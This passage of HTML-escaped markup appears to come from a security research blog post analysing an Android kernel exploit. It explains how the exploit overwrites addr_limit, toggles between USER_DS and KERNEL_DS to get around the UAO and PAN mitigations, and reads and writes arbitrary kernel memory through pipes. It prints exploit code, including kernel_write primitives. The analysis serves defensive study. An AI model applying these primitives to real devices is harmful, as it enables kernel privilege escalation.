value &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;~(0xFFFFFF8000000000 &amp;amp; 0xFFFFFFFFFFFCFEFF) = 0x7FFFFFFFFF&lt;/span&gt;&lt;span&gt;, also known as&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;. We&amp;rsquo;ll talk about why they&amp;rsquo;re overwriting the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;as &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;in the next section. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17\" id=\"h.k1hy6h4fm2ex\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Working Around UAO and PAN&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;&amp;ldquo;User-Access Override&amp;rdquo; (UAO) and &amp;ldquo;Privileged Access Never&amp;rdquo; (PAN) are two exploit mitigations that are commonly found on modern Android devices. Their kernel configs are &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;CONFIG_ARM64_UAO&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;CONFIG_ARM64_PAN&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. Both PAN and UAO are hardware mitigations released on ARMv8 CPUs. PAN protects against the kernel directly accessing user-space memory. UAO works with PAN by allowing unprivileged load and store instructions to act as privileged load and store instructions when the UAO bit is set.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;It&amp;rsquo;s often said that the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;overwrite technique detailed above doesn&amp;rsquo;t work on devices with UAO and PAN turned on. The commonly used &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;overwrite technique was to change the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;to a very high address, like 0xFFFFFFFFFFFFFFFF (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;), and then use a pair of pipes for arbitrary kernel read and write. This is what Jann and I did in our &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885#176\"&gt;proof-of-concept for CVE-2019-2215&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;back in 2019. Our &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kernel_write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;function is shown below.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b8a4e52cd732ff2532144e609e086484605b13e2\"&gt;&lt;/a&gt;&lt;a id=\"t.29\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kernel_write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kaddr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; errno &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;len &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x1000&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;errx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;],&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;kernel_write failed to load userspace buffer&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;read&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;],&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kaddr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;kernel_write failed to overwrite kernel memory&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;This technique works by first writing the pointer to the buffer of the contents that you&amp;rsquo;d like written to one end of the pipe. By then calling a read and passing in the kernel address you&amp;rsquo;d like to write to, those contents are then written to that kernel memory address.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;With UAO and PAN enabled, if the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;is set to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;and we attempt to execute this function, the first &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;write&lt;/span&gt;&lt;span&gt;&amp;nbsp;call will fail because &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;is in user-space memory and PAN prevents the kernel from accessing user space memory.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;Let&amp;rsquo;s say we didn&amp;rsquo;t set the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;(-1) and instead set it to -2, a high kernel address that&amp;rsquo;s not &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. PAN wouldn&amp;rsquo;t be enabled, but neither would UAO. Without UAO enabled, the unprivileged load and store instructions are not able to access the kernel memory.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;The way the exploit works around the constraints of UAO and PAN is pretty straightforward: the exploit switches the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;between &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;based on whether it needs to access user space or kernel space memory. As shown in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;uao_thread_switch&lt;/span&gt;&lt;span&gt;&amp;nbsp;function below, UAO is enabled when &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit == KERNEL_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;and is disabled when it does not.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.48779bb108abd35cde6afd98c7e3e69e08c1473f\"&gt;&lt;/a&gt;&lt;a id=\"t.30\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/* Restore the UAO state depending on next&amp;#39;s addr_limit */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;uao_thread_switch&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;task_struct &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;next&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;IS_ENABLED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;CONFIG_ARM64_UAO&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;task_thread_info&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;next&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;addr_limit &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;==&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KERNEL_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;asm&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ALTERNATIVE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;nop&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;SET_PSTATE_UAO&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ARM64_HAS_UAO&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;asm&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ALTERNATIVE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;nop&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;SET_PSTATE_UAO&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ARM64_HAS_UAO&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;The exploit was able to use this technique of toggling the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;between &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;because they had such a good primitive from the use-after-free and could reliably and repeatedly write a new value to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;by calling &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. The exploit&amp;rsquo;s function to write to kernel addresses is shown below:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5c077e3ae1ab4068a405f87ee040f15caac71721\"&gt;&lt;/a&gt;&lt;a id=\"t.31\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kaddr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;const&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf_len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;USER_DS &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x7FFFFFFFFF&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span 